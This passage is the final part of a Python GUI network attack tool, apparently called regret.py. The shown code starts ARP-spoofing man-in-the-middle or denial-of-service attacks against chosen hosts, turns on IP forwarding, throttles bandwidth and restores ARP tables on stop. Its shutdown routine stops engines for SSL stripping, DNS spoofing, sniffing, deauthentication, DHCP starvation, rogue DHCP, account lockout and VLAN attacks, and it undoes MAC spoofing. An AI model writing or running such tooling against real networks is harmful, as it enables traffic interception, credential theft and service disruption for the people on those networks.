        sel = [h for h in sel if h['ip'] not in self._whitelist_ips]
        if not sel:
            self.log('[!] All selected targets are whitelisted — nothing to attack', 'warn')
            return
        iface = self._iface.get()
        if not iface:
            self.log('[-] No interface selected', 'error')
            return

        self._engine = AttackEngine(iface, self.log)
        if not self._engine.init_gateway():
            return

        atk  = self._atk_type.get()
        mitm = self._atk_mode.get() == 'mitm'
        rate = int(self._bw_var.get()) if self._bw_enabled.get() else None
        ivl  = round(self._interval_var.get(), 1)

        set_ip_forward(mitm)

        if atk == 'perhost':
            for h in sel:
                self._engine.start_host(h['ip'], rate_kbps=rate)
        else:
            self._engine.start_garp(sel, mitm=mitm, interval=ivl)

        self._running = True
        self._start_btn.configure(state='disabled')
        self._stop_btn.configure(state='normal')
        mode_str = 'MITM' if mitm else 'DoS'
        self._set_status(
            f'●  RUNNING  |  {atk.upper()}  |  {mode_str}  |  {len(sel)} target(s)')
        self._nb.select(self._tab_log)

    def _stop_attack(self):
        self._stop_btn.configure(state='disabled')
        self._set_status('●  Stopping ...')
        threading.Thread(target=self._stop_worker, daemon=True).start()

    def _stop_worker(self):
        if self._engine:
            self._engine.stop_all()
        self.after(0, self._post_stop)

    def _post_stop(self):
        self._running = False
        self._start_btn.configure(state='normal')
        self._stop_btn.configure(state='disabled')
        self._set_status('●  Stopped — ARP restored')

    # ── Log ───────────────────────────────────────────────────────────────────

    def log(self, msg, level=''):
        def _do():
            self._log_text.configure(state='normal')
            ts  = time.strftime('%H:%M:%S')
            tag = level if level in ('error', 'success', 'info', 'warn') else ''
            self._log_text.insert('end', f'[{ts}]  {msg}\n', tag)
            self._log_text.see('end')
            self._log_text.configure(state='disabled')
        self.after(0, _do)

    def _clear_log(self):
        self._log_text.configure(state='normal')
        self._log_text.delete('1.0', 'end')
        self._log_text.configure(state='disabled')

    def _set_status(self, msg):
        self._status_lbl.configure(text=msg)

    # ── Close ─────────────────────────────────────────────────────────────────

    def _on_close(self):
        if self._engine:
            self._engine.stop_all()
        if self._sslstrip_engine:
            self._sslstrip_engine.stop()
        if self._stress_engine:
            self._stress_engine.stop()
        if self._dns_engine:
            self._dns_engine.stop()
        if self._sniffer_engine:
            self._sniffer_engine.stop()
        if self._autoatk_engine:
            self._autoatk_engine.stop()
        if self._lockout_engine:
            self._lockout_engine.stop()
        for _eng in (self._ndp_engine, self._passive_engine,
                     self._dhcp_starv_eng, self._rogue_dhcp_eng,
                     self._deauth_engine, self._redirect_engine,
                     self._vlan_engine):
            if _eng:
                try:
                    _eng.stop()
                except Exception:
                    pass
        # Restore MAC if changed
        for iface, orig in self._original_mac.items():
            if self._mac_changed and orig:
                try:
                    apply_mac(iface, orig)
                except Exception:
                    pass
        self.destroy()


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    if os.geteuid() != 0:
        print('[-] Must run as root:  sudo python3 regret.py')
        sys.exit(1)

    # Authentication gate
    login = LoginWindow()
    login.mainloop()
    if not login.authenticated:
        sys.exit(0)

    # Launch main app
    app = RegretApp()
    app.mainloop()


if __name__ == '__main__':
    main()
